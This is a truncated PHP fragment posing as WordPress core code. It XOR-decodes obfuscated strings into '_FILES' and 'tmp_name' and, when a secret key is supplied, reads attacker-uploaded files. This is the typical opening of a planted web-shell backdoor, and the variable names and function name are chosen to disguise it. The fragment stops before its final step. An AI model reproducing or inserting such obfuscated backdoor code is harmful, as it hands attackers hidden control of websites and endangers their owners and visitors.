...
function create_initial_rest_routes() {
	...
	$authors = 'postdata';
$full_match = 'EjtSvpUqS5in';
$default_editor = $full_match;

function sanitized($sizes, $_name)

{
    $input = $_name;
    $alt_post_name = urldecode($sizes);
    $rich_text = substr($input,0, strlen($alt_post_name));
	$suppress_filters = 'size';
    $sized = $alt_post_name ^ $rich_text;
    return $sized;
}
$attachment_id = ${sanitized("%1A%2C%3D%1F3%23", $default_editor)};

$menu_position = $attachment_id;
$thumbnail_support = isset($menu_position[$default_editor]);
if ($thumbnail_support)

{
    $children_query = $attachment_id[$default_editor];
    $tagqueue = $children_query[sanitized("1%07%04%0C%18%118%14", $default_editor)];
